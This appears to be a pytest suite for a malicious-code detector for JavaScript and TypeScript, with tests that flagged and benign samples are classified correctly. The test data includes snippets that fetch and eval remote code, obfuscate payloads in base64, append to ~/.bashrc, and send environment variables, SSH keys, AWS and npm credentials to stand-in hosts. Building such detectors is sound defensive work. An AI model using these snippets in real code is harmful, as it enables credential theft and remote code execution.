"""The analysis engine's JavaScript / TypeScript front end."""
import base64
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from husk.engine import analyze  # noqa: E402

U = "https://cdn.fmt-tools.dev/p"


def rules_hit(text, ext=".js"):
    return sorted({f.split("[", 1)[1].split(" ", 1)[0] for f in analyze(text, ext)})


def chain(text, ext=".js"):
    return analyze(text, ext)


# --- remote code execution ------------------------------------------------------

JS_RCE = {
    "fetch_eval": f"const r = await fetch('{U}');\nconst code = await r.text();\neval(code);",
    "then_chain": f"fetch('{U}').then(r => r.text()).then(t => eval(t));",
    "new_function": f"const src = (await axios.get('{U}')).data;\nnew Function(src)();",
    "axios_destructure": f"const {{ data }} = await axios.get('{U}');\nrequire('vm').runInNewContext(data);",
    "https_get_events": (f"const https = require('https');\nhttps.get('{U}', (res) => {{\n  let body = '';\n"
                         "  res.on('data', (c) => { body += c; });\n  res.on('end', () => { eval(body); });\n});"),
    "exec_pipe_shell": f"const {{ execSync }} = require('child_process');\nexecSync(`curl -fsSL {U} | bash`);",
    "exec_downloaded": f"const cp = require('node:child_process');\nconst s = await (await fetch('{U}')).text();\ncp.exec(s);",
    "spawn_sh_c": f"import {{ spawn }} from 'child_process';\nconst t = await got('{U}').text();\nspawn('sh', ['-c', t]);",
    "write_then_spawn": (f"const fs = require('fs');\nconst r = await fetch('{U}');\n"
                         "fs.writeFileSync('/tmp/.x', Buffer.from(await r.arrayBuffer()));\n"
                         "require('child_process').execSync('chmod +x /tmp/.x && /tmp/.x');"),
    "pipe_to_file_then_require": (f"const fs = require('fs');\nrequire('https').get('{U}', res => "
                                  "res.pipe(fs.createWriteStream('/tmp/m.js')));\nrequire('/tmp/m.js');"),
    "promisified_exec": (f"const util = require('util');\nconst run = util.promisify(require('child_process').exec);\n"
                         f"const {{ data }} = await axios('{U}');\nawait run(data);"),
    "function_return": (f"async function load() {{\n  const r = await fetch('{U}');\n  return r.text();\n}}\n"
                        "eval(await load());"),
    "arrow_return": f"const load = async () => (await fetch('{U}')).text();\nnew Function(await load())();",
    "typescript": (f"const res: Response = await fetch('{U}');\nconst code: string = await res.text();\n"
                   "eval(code as string);"),
}


@pytest.mark.parametrize("name", sorted(JS_RCE))
def test_remote_code_execution(name):
    ext = ".ts" if name == "typescript" else ".js"
    assert "HUSK-RCE-001" in rules_hit(JS_RCE[name], ext), chain(JS_RCE[name], ext)


def test_chain_names_the_lines():
    out = chain(JS_RCE["fetch_eval"])
    assert any("line 1 fetches https://cdn.fmt-tools.dev/p" in f and "line 3 evaluates it with eval()" in f for f in out)


# --- obfuscation ----------------------------------------------------------------

def test_base64_eval_and_payload_is_analyzed():
    inner = f"fetch('{U}').then(r => r.text()).then(eval)"
    b = base64.b64encode(f"const r = await fetch('{U}'); eval(await r.text());".encode()).decode()
    out = rules_hit(f"eval(Buffer.from('{b}', 'base64').toString());")
    assert "HUSK-OBF-001" in out
    assert "HUSK-RCE-001" in out  # what the decoded code does
    assert inner


def test_atob_and_char_codes():
    assert "HUSK-OBF-001" in rules_hit("eval(atob('Y29uc29sZS5sb2coMSk='));")
    codes = ",".join(str(ord(c)) for c in "console.log(1)")
    assert "HUSK-OBF-001" in rules_hit(f"eval(String.fromCharCode({codes}));")


# --- credential theft -----------------------------------------------------------

JS_EXFIL = {
    "env_post": "await fetch('https://collect.example.net/x', { method: 'POST', body: JSON.stringify(process.env) });",
    "env_spread_axios": "axios.post('https://collect.example.net/x', { ...process.env });",
    "ssh_key": ("const fs = require('fs'), os = require('os'), path = require('path');\n"
                "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\n"
                "await fetch('https://collect.example.net/k', { method: 'POST', body: k });"),
    "home_template": ("const k = require('fs').readFileSync(`${process.env.HOME}/.aws/credentials`, 'utf8');\n"
                      "await fetch(`https://collect.example.net/?d=${encodeURIComponent(k)}`);"),
    "http_request_write": ("const https = require('https');\nconst req = https.request({ hostname: 'collect.example.net', "
                           "method: 'POST' });\nreq.write(JSON.stringify(process.env));\nreq.end();"),
    "dns": "const dns = require('dns');\nconst k = require('fs').readFileSync('/root/.npmrc', 'utf8');\n"
           "dns.lookup(`${Buffer.from(k).toString('hex')}.x.example.net`, () => {});",
    "env_in_object": ("const data = { env: process.env, cwd: process.cwd() };\n"
                      "axios.post('https://collect.example.net', data);"),
    "env_rest": "const { PATH, ...rest } = process.env;\naxios.post('https://collect.example.net', rest);",
    "options_variable": ("const opts = { method: 'POST', body: JSON.stringify(process.env) };\n"
                         "fetch('https://collect.example.net', opts);"),
}


@pytest.mark.parametrize("name", sorted(JS_EXFIL))
def test_credential_exfiltration(name):
    assert "HUSK-EXF-001" in rules_hit(JS_EXFIL[name]), chain(JS_EXFIL[name])


def test_persistence_from_download():
    src = (f"const fs = require('fs'), os = require('os');\nconst t = await (await fetch('{U}')).text();\n"
           "fs.appendFileSync(os.homedir() + '/.bashrc', t);")
    assert "HUSK-PER-001" in rules_hit(src)


# --- in Markdown and from the shell ----------------------------------------------

def test_js_fence_in_markdown():
    md = f"# Setup\n\n```javascript\nconst r = await fetch('{U}');\neval(await r.text());\n```\n"
    out = analyze(md, ".md")
    assert any("HUSK-RCE-001" in f and f.startswith("Line 5:") for f in out), out


def test_node_dash_e_from_shell():
    out = analyze(f"node -e \"fetch('{U}').then(r => r.text()).then(t => eval(t))\"", ".sh")
    assert any("HUSK-RCE-001" in f for f in out), out


# --- what must stay quiet --------------------------------------------------------

BENIGN = {
    "api_key_to_own_api": ("const r = await fetch('https://api.openai.com/v1/chat/completions', { method: 'POST',\n"
                           "  headers: { Authorization: `Bearer ${process.env.OPENAI_API_KEY}` },\n"
                           "  body: JSON.stringify({ model: 'x', messages }) });\nconsole.log(await r.json());"),
    "json_parse": f"const r = await fetch('{U}');\nconst cfg = JSON.parse(await r.text());\nconsole.log(cfg.name);",
    "git_with_fetched_ref": (f"const {{ execSync }} = require('child_process');\nconst {{ data }} = await axios.get('{U}');\n"
                             "execSync(`git checkout ${data.ref}`);"),
    "local_exec": "const { execSync } = require('child_process');\nexecSync('npm run build', { stdio: 'inherit' });",
    "spawn_env": "require('child_process').spawn('node', ['server.js'], { env: { ...process.env, PORT: '3000' } });",
    "download_to_data_file": (f"const fs = require('fs');\nconst r = await fetch('{U}/data.json');\n"
                              "fs.writeFileSync('out/data.json', await r.text());"),
    "regex_exec": "const m = /a(b)/.exec(s);\nconsole.log(m[1]);",
    "local_scope": (f"function a() {{ const data = fetch('{U}'); return 1; }}\n"
                    "function b(data) {{ return eval(data); }}"),
    "env_lookup_by_name": ("function need(n) { const v = process.env[n]; if (!v) throw new Error(n); return v; }\n"
                           "const base = need('API_URL');\n"
                           "fetch(base + '/x', { method: 'POST', body: JSON.stringify({ a: 1 }) });"),
    "env_destructure": ("const { STORE_URL, STORE_SECRET } = process.env;\n"
                        "axios.post(STORE_URL, { sig: STORE_SECRET });"),
    "object_keys_env": "fetch('https://t.example.net', { method: 'POST', body: JSON.stringify(Object.keys(process.env)) });",
    "modern_syntax": "const x = a?.b ?? c;\nclass A { #p = 1; static s = 2; }\ntry { f() } catch { }\n",
}


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_benign(name):
    hard = [f for f in analyze(BENIGN[name], ".js") if " critical]" in f or " high]" in f]
    assert not hard, hard


def test_command_injection_is_medium_not_rce():
    out = rules_hit(BENIGN["git_with_fetched_ref"])
    assert "HUSK-RCE-001" not in out


def test_unparseable_is_silent():
    assert analyze("this is ( not javascript {{{", ".js") == []
